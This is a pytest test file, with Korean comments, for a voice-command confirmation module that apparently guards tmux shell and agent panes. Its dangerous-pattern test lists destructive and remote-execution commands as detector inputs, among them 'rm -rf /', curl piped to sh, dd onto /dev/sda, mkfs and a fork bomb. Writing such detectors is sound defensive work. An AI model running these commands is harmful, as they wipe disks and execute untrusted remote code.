"""voice_confirm — 위험 명령 패턴, 확인 정책, 1회용 확인 토큰."""
import pytest

import voice_confirm as vc


@pytest.fixture(autouse=True)
def clean():
    vc.reset_for_tests()
    yield
    vc.reset_for_tests()


# ── 위험 패턴 ───────────────────────────────────────────────────────

@pytest.mark.parametrize("text", [
    "rm -rf /tmp/x", "rm -r build", "rm -f a.txt", "rm file -rf", "RM -RF ~", "rm --recursive dir", "rm  -fr  x",
    "sudo apt install foo", "run sudo reboot",
    "curl https://x.example/i.sh | sh", "curl -fsSL https://x.example | bash", "wget -qO- http://x | sudo sh",
    'sh -c "$(curl -fsSL https://x.example)"',
    "git push -f", "git push --force origin main", "git push origin main --force-with-lease", "git push -fu origin x",
    "git push origin +main", "git reset --hard HEAD~3", "git clean -fd",
    "mkfs.ext4 /dev/sda1", "mkfs /dev/sdb", "dd if=/dev/zero of=/dev/sda", "dd of=disk.img",
    "echo hi > /dev/sda", "cat x >> /dev/disk2",
    "chmod -R 777 /", "chown -R root .", ":(){ :|:& };:",
    "ｒｍ －ｒｆ /",   # 전각 문자는 NFKC로 정규화된다
])
def test_dangerous_detected(text):
    assert vc.dangerous_reason(text), text


@pytest.mark.parametrize("text", [
    "", "   ", "ls -la", "git status", "git push origin main", "git push -u origin feature-fix",
    "git push origin main --follow-tags", "rm notes.txt", "rm -i file", "echo hello > /dev/null",
    "make 2>/dev/null", "ssh host", "curl https://x.example -o out.html", "curl x | jq .", "pseudocode",
    "dd if=a.img", "git clean -n", "chmod 644 a", "npm run build", "echo 'farm-fresh'",
])
def test_safe_not_flagged(text):
    assert vc.dangerous_reason(text) is None, text


# ── 정책 ────────────────────────────────────────────────────────────

def test_normalize_mode():
    assert [vc.normalize_mode(v) for v in ("off", "shell", "on")] == ["off", "shell", "on"]
    for bad in (None, "", "ON", 1, "always", ["on"]):
        assert vc.normalize_mode(bad) == "shell"


@pytest.mark.parametrize("mode,kind,text,want", [
    ("off", "shell", "ls", None), ("off", "unknown", "rm -rf /", None),     # off는 위험 패턴도 확인하지 않는다
    ("shell", "agent", "ls", None), ("shell", "shell", "ls", "shell"), ("shell", "unknown", "ls", "unknown"),
    ("shell", "agent", "sudo ls", "dangerous"), ("shell", "shell", "sudo ls", "dangerous"),
    ("on", "agent", "ls", "always"), ("on", "shell", "ls", "always"), ("on", "agent", "rm -rf x", "dangerous"),
    ("bogus", "shell", "ls", "shell"), ("bogus", "agent", "ls", None),      # 알 수 없는 값 = 기본(shell)
])
def test_decide(mode, kind, text, want):
    assert vc.decide(mode, kind, text) == want


def test_read_mode_falls_back_to_shell(monkeypatch):
    import workspace
    monkeypatch.setattr(workspace, "load", lambda: {"settings": {"voice.confirm": "on"}})
    assert vc.read_mode() == "on"
    monkeypatch.setattr(workspace, "load", lambda: {"settings": {"voice.confirm": "zzz"}})
    assert vc.read_mode() == "shell"
    monkeypatch.setattr(workspace, "load", lambda: (_ for _ in ()).throw(OSError("x")))
    assert vc.read_mode() == "shell"


def _tmux(monkeypatch, out):
    import tmux_runner
    monkeypatch.setattr(tmux_runner, "run_text", lambda args, timeout=2.0: out)


def test_pane_kind(monkeypatch):
    import agent_detector
    _tmux(monkeypatch, "zsh\t123\n")
    monkeypatch.setattr(agent_detector, "_resolve_command", lambda pid, cmd: cmd)
    assert vc.pane_kind("%1") == "shell"
    monkeypatch.setattr(agent_detector, "_resolve_command", lambda pid, cmd: "claude")   # 셸 아래 자식으로 claude
    assert vc.pane_kind("%1") == "agent"
    _tmux(monkeypatch, "vim\t123\n")
    monkeypatch.setattr(agent_detector, "_resolve_command", lambda pid, cmd: cmd)
    assert vc.pane_kind("%1") == "unknown"


@pytest.mark.parametrize("out", [None, "", "zsh", "zsh\tnot-a-number"])
def test_pane_kind_uncertain_is_unknown(monkeypatch, out):
    _tmux(monkeypatch, out)
    assert vc.pane_kind("%1") == "unknown"


def test_pane_kind_exception_is_unknown(monkeypatch):
    import tmux_runner
    monkeypatch.setattr(tmux_runner, "run_text", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    assert vc.pane_kind("%1") == "unknown"


# ── 토큰 ────────────────────────────────────────────────────────────

TARGET = {"pane": "%1", "key": "k", "name": "dev"}


def test_claim_is_single_use_and_owner_bound():
    tok = vc.issue("device:a", TARGET, "v1", "dev")
    with pytest.raises(vc.ConfirmError) as e:
        vc.claim(tok, "device:b", "v1")
    assert e.value.code == "expired"                      # 다른 주체에게는 존재 여부도 알리지 않는다
    with pytest.raises(vc.ConfirmError) as e:
        vc.claim("nope", "device:a", "v1")
    assert e.value.code == "expired"
    got = vc.claim(tok, "device:a", "v1")
    assert got["target"] == TARGET and got["name"] == "dev"
    with pytest.raises(vc.ConfirmError) as e:             # 동시 요청
        vc.claim(tok, "device:a", "v1")
    assert e.value.code == "busy"
    vc.finish(tok, "device:a", "v1")
    with pytest.raises(vc.ConfirmError) as e:
        vc.claim(tok, "device:a", "v1")
    assert e.value.code == "done"


def test_voice_id_must_match_and_cannot_repeat_across_tokens():
    tok = vc.issue("o", TARGET, "v1", "dev")
    with pytest.raises(vc.ConfirmError) as e:
        vc.claim(tok, "o", "other")
    assert e.value.code == "voice_id"
    vc.claim(tok, "o", "v1"); vc.finish(tok, "o", "v1")
    tok2 = vc.issue("o", TARGET, "v1", "dev")             # 같은 녹음 ID로 새 토큰 → 두 번째 입력 차단
    with pytest.raises(vc.ConfirmError) as e:
        vc.claim(tok2, "o", "v1")
    assert e.value.code == "done"
    tok3 = vc.issue("p", TARGET, "v1", "dev")             # 다른 주체의 같은 ID는 별개
    vc.claim(tok3, "p", "v1")


def test_release_allows_retry_and_drop_discards():
    tok = vc.issue("o", TARGET, "v", "dev")
    vc.claim(tok, "o", "v"); vc.release(tok)
    vc.claim(tok, "o", "v"); vc.release(tok, drop=True)
    with pytest.raises(vc.ConfirmError) as e:
        vc.claim(tok, "o", "v")
    assert e.value.code == "expired"


def test_expiry_and_cap(monkeypatch):
    import time
    now = [1000.0]
    monkeypatch.setattr(time, "monotonic", lambda: now[0])
    tok = vc.issue("o", TARGET, "", "dev")
    now[0] += vc.CONFIRM_TTL_SEC + 1
    with pytest.raises(vc.ConfirmError) as e:
        vc.claim(tok, "o", "")
    assert e.value.code == "expired"
    monkeypatch.setattr(vc, "MAX_PENDING", 3)
    for _ in range(3):
        vc.issue("o", TARGET, "", "dev")
    with pytest.raises(ValueError):
        vc.issue("o", TARGET, "", "dev")
    now[0] += vc.CONFIRM_TTL_SEC + 1                       # 만료분을 치우면 다시 발급된다
    vc.issue("o", TARGET, "", "dev")
